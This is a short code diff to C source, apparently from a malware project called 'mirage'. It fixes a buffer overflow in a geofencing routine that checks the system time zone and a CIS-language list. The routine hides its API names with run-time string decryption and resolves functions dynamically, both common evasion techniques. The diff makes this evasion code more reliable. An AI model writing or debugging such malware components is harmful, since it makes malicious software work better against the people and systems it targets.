@@ -19,12 +19,10 @@
 size_t mirage_tzi_struct_size(void);
 
 size_t mirage_tzi_struct_size(void) {
-    typedef struct {
-        int32_t Bias;
-        uint16_t StandardName[32];
-        /* mirrors the LITE decl used at the call site (pre-fix) */
-    } TIME_ZONE_INFORMATION_LITE_TEST;
-    return sizeof(TIME_ZONE_INFORMATION_LITE_TEST);
+    /* Real Windows TIME_ZONE_INFORMATION — what the (fixed) call site
+     * now passes to GetTimeZoneInformation. The pre-fix LITE decl was
+     * 68 bytes; the kernel wrote 104 bytes past it. */
+    return sizeof(TIME_ZONE_INFORMATION);
 }
 
 int is_cis_language(uint16_t lang_id) {
@@ -219,19 +217,17 @@ mirage_geo_result mirage_check_geo_block(void) {
     char dll2[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll2);
     void* kernel32 = load_module(dll2);
     if (kernel32) {
-        /* GetTimeZoneInformation */
-        typedef struct {
-            int32_t Bias;
-            WCHAR StandardName[32];
-            /* SYSTEMTIME omitted for brevity — we only need Bias */
-        } TIME_ZONE_INFORMATION_LITE;
+        /* GetTimeZoneInformation — full TIME_ZONE_INFORMATION (172 B).
+         * The old LITE decl (68 B) let the kernel write 104 bytes past
+         * the struct; mirage_tzi_struct_size() locks the fixed size. */
+        typedef TIME_ZONE_INFORMATION TZI_FULL;
 
-        typedef int (*fn_GetTimeZoneInformation)(TIME_ZONE_INFORMATION_LITE*);
+        typedef int (*fn_GetTimeZoneInformation)(TZI_FULL*);
         char fn2[32]; enc_decrypt(enc_GetTimeZoneInformation, ENC_GETTIMEZONEINFORMATION_LEN, fn2);
         fn_GetTimeZoneInformation pGetTzi =
             (fn_GetTimeZoneInformation)resolve_func(kernel32, fn2);
         if (pGetTzi) {
-            TIME_ZONE_INFORMATION_LITE tzi;
+            TZI_FULL tzi;
             memset(&tzi, 0, sizeof(tzi));
             pGetTzi(&tzi);
             int bias_hours = -(tzi.Bias / 60);
